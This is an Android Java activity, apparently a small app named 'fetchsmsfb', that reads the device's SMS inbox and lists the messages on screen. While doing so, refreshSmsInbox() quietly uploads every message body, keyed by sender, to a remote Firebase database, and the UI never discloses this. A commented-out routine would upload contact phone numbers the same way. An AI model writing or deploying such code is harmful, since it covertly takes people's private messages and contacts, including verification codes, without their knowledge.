package com.developerss.android.fetchsmsfb;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.SimpleCursorAdapter;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    ArrayList<String> smsMessagesList = new ArrayList<>();
    ListView smsListView;
    ArrayAdapter arrayAdapter;

    Button sendButton;
    int i = 1;

    FirebaseDatabase database = FirebaseDatabase.getInstance();
    final DatabaseReference reference = database.getReference("Messages");
    final DatabaseReference referenceContact = database.getReference("Contacts");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        smsListView = findViewById(R.id.sms_list);
        sendButton = findViewById(R.id.send_button);

        arrayAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, smsMessagesList);
        smsListView.setAdapter(arrayAdapter);

        // Add SMS Read Permision At Runtime
        // Todo : If Permission Is Not GRANTED
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            // Todo : If Permission Granted Then Show SMS
            refreshSmsInbox();

        } else {
            // Todo : Then Set Permission
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        }




        sendButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

            }
        });

        // Here, thisActivity is the current activity
//        if (ContextCompat.checkSelfPermission(MainActivity.this, "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
//            getContact();
//        } else {
//            // No explanation needed; request the permission
//            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
//            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_CONTACTS"}, REQUEST_CODE_ASK_PERMISSIONS);
//        }

    }


    public void refreshSmsInbox() {
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        if (indexBody < 0 || !smsInboxCursor.moveToFirst())
            return;
        arrayAdapter.clear();
        do {
            String name = smsInboxCursor.getString(indexAddress);
            String msg = smsInboxCursor.getString(indexBody);
            reference.child(name).child("Message" + i).setValue(msg);
            i++;
            String str = "SMS From: " + smsInboxCursor.getString(indexAddress) +
                    "\n" + smsInboxCursor.getString(indexBody) + "\n" + "Trying my Best!";
            arrayAdapter.add(str);
        } while (smsInboxCursor.moveToNext());
    }

//    public void getContact() {
////        StringBuilder builder = new StringBuilder();
//        ContentResolver contentResolver = getContentResolver();
//        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
//
//        if (cursor.getCount() > 0) {
//            while (cursor.moveToNext()) {
//                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
//                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
//                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
//
//                if (hasPhoneNumber > 0) {
//                    Cursor contactCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                            null,
//                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
//                            new String[]{id}, null);
//
//                    while (contactCursor.moveToNext()) {
////                    String name = smsInboxCursor.getString(indexAddress);
//                        String phoneNumber = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//
//                        reference.child(name).child("Contact").setValue(phoneNumber);
//                    }
//                    contactCursor.close(); //////
//                }
//            }
//        }
//        cursor.close();
//    }

}
